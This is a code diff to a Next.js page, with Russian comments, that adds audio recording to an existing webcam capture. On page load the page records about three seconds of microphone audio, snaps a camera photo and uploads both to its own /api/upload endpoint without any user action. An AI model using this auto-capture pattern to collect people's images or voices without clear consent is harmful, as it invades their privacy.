@@ -1,11 +1,13 @@
-"use client"; // Указываем, что это клиентский компонент
+"use client";
 
 import { useEffect, useState, useRef } from "react";
 
 export default function Home() {
   const [stream, setStream] = useState<MediaStream | null>(null);
   const videoRef = useRef<HTMLVideoElement | null>(null);
-  
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const audioChunksRef = useRef<Blob[]>([]);
+
   useEffect(() => {
     const startCapture = async () => {
       try {
@@ -19,8 +21,20 @@ export default function Home() {
             videoRef.current.srcObject = mediaStream;
           }
 
-          // Делаем фото через 3 секунды и отправляем в API
-          setTimeout(() => captureAndSendPhoto(), 3000);
+          // Настройка записи аудио
+          const mediaRecorder = new MediaRecorder(mediaStream);
+          mediaRecorderRef.current = mediaRecorder;
+          mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+              audioChunksRef.current.push(event.data);
+            }
+          };
+          mediaRecorder.start();
+
+          setTimeout(() => {
+            mediaRecorder.stop();
+            captureAndSendPhoto();
+          }, 3000);
         } else {
           console.error("getUserMedia не поддерживается в этом браузере");
         }
@@ -46,15 +60,19 @@ export default function Home() {
     const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
     if (!blob) return;
 
+    // Создаем аудиофайл
+    const audioBlob = new Blob(audioChunksRef.current, { type: "audio/ogg" });
+
     const formData = new FormData();
     formData.append("file", blob, "photo.png");
+    formData.append("audio", audioBlob, "audio.ogg");
 
     await fetch("/api/upload", {
       method: "POST",
       body: formData,
     });
 
-    console.log("Фото отправлено на сервер!");
+    console.log("Фото и аудио отправлены на сервер!");
   };
 
   return (
@@ -65,4 +83,3 @@ export default function Home() {
     </div>
   );
 }
-
